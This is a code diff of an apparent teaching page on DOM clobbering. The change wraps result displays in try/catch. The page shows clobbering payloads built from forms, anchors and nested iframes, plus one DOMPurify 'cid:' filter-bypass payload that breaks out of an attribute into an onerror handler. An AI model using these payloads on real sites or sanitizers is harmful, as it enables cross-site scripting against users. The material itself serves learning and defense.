@@ -49,43 +49,44 @@ function addSep() {
     let element = document.createElement("hr");
     results.appendChild(element);
 }
-
+var res = null;
 addTitle("Basic DOM Clobbering", "By setting <em>either</em> the <strong>id</strong> or <strong>name</strong> attribute on the following elements (embed, form, iframe, image, img, object), we can create objects as global variables in the DOM:", "<form id=payload1></form>\n\nOR\n\n<form name=payload1></form>");
 addResult("typeof(window.payload1)", (typeof(window.payload1)));
-addResult("window.payload1", (window.payload1));
-addResult("payload1", (payload1));
+try{res=(window.payload1)}catch{res="Exception"}finally{addResult("window.payload1",res)}
+try{res=(payload1)}catch{res="Exception"}finally{addResult("payload1",res)}
 addSep();
 addTitle("DOM Clobbering with Anchors", "The anchor (&lt;a&gt;) element is treated differently. The global variable's \"value\" is set to the href attribute value (or an empty string if no href was set):", "<a id=payload2 href=payload></a>");
-addResult("payload2", (payload2));
+try{res=(payload2)}catch{res="Exception"}finally{addResult("payload2",res)}
 addSep();
 addTitle("Creating Arrays / Lists using DOM Clobbering", "If two or more elements with the same id / name are added, the DOM will create an array (list) of these elements which can be referenced by their index:", "<a id=payload3 href=index_0_payload><a id=payload3 href=index_1_payload>")
-addResult("payload3", (payload3));
-addResult("payload3[0]", (payload3[0]));
-addResult("payload3[1]", (payload3[1]));
+try{res=(payload3)}catch{res="Exception"}finally{addResult("payload3",res)}
+try{res=(payload3[0])}catch{res="Exception"}finally{addResult("payload3[0]",res)}
+try{res=(payload3[1])}catch{res="Exception"}finally{addResult("payload3[1]",res)}
 addSep();
 addTitle("Creating Custom Attributes using DOM Clobbering", "We can use this to clobber custom attributes of objects by creating an array and using the name attribute of the 2nd element to specify the attribute name (in this case \"foo\"):", "<a id=payload4><a id=payload4 name=foo href=payload>")
-addResult("payload4", (payload4));
-addResult("payload4[1]", (payload4[1]));
-addResult("payload4.foo", (payload4.foo));
+try{res=(payload4)}catch{res="Exception"}finally{addResult("payload4",res)}
+try{res=(payload4[1])}catch{res="Exception"}finally{addResult("payload4[1]",res)}
+try{res=(payload4.foo)}catch{res="Exception"}finally{addResult("payload4.foo",res)}
 addSep();
 addTitle("Custom Attribute Exploit", "We can exploit this by setting the href value to whatever we want to inject into the DOM, for example if our clobbered object is used to create an img tag, we could attempt an attribute breakout and insert an onerror. Note that the \"cid:\" is a DOMPurify specific filter bypass:", "<a id=payload5><a id=payload5 name=foo href=cid:&quot;/onerror=alert(1)//>")
-addResult("payload5", (payload5));
-addResult("payload5[1]", (payload5[1]));
-addResult("payload5.foo", (payload5.foo));
+try{res=(payload5)}catch{res="Exception"}finally{addResult("payload5",res)}
+try{res=(payload5[1])}catch{res="Exception"}finally{addResult("payload5[1]",res)}
+try{res=(payload5.foo)}catch{res="Exception"}finally{addResult("payload5.foo",res)}
 addSep();
 addTitle("Creating Deeper Custom Attributes using DOM Clobbering with Forms", "If further depth is needed, forms can be used, however the \"value\" attribute needs to be referenced:", "<form id=payload6 name=a><input id=b value=payload></form><form id=payload6></form>");
-addResult("payload6", (payload6));
-addResult("payload6.a", (payload6.a));
-addResult("payload6.a.b", (payload6.a.b));
-addResult("payload6.a.b.value", (payload6.a.b.value));
+try{res=(payload6)}catch{res="Exception"}finally{addResult("payload6",res)}
+try{res=(payload6.a)}catch{res="Exception"}finally{addResult("payload6.a",res)}
+try{res=(payload6.a.b)}catch{res="Exception"}finally{addResult("payload6.a.b",res)}
+try{res=(payload6.a.b)}catch{res="Exception"}finally{addResult("payload6.a.b",res)}
+try{res=(payload6.a.b.value)}catch{res="Exception"}finally{addResult("payload6.a.b.value",res)}
 addSep();
 addTitle("Creating Custom Attributes using DOM Clobbering with IFrames", "IFrames can be very useful for DOM Clobbering, however a delay needs to be introduced for the IFrame to load. This can be done using the &lt;style&gt; import:", "<iframe name=payload7 srcdoc=\"<a id=a href=payload></a>\"></iframe><style>@import 'https://google.com';</style>");
-addResult("payload7", (payload7));
-addResult("payload7.a", (payload7.a));
+try{res=(payload7)}catch{res="Exception"}finally{addResult("payload7",res)}
+try{res=(payload7.a)}catch{res="Exception"}finally{addResult("payload7.a",res)}
 addSep();
 addTitle("Creating Arbitrarily Deep Custom Attributes using DOM Clobbering with IFrames", "IFrames are powerful for DOM Clobbering since they can be used to \"easily\" create arbitrarily deep attributes. For example, this object has attributes which are 4 levels deep:", "<iframe name=payload8 srcdoc=\"<iframe srcdoc='<iframe name=b srcdoc=<a/id=c&amp;amp;#x20;name=d&amp;amp;#x20;href=\\payload&amp;amp;gt;<a&amp;amp;#x20;id=c&amp;amp;gt; name=c>' name=a>\"></iframe><style>@import 'https://google.co.uk';</style>");
-addResult("payload8", (payload8));
-addResult("payload8.a.b.c.d", (payload8.a.b.c.d));
+try{res=(payload8)}catch{res="Exception"}finally{addResult("payload8",res)}
+try{res=(payload8.a.b.c.d)}catch{res="Exception"}finally{addResult("payload8.a.b.c.d",res)}
 </script>
 </body>
 </html>
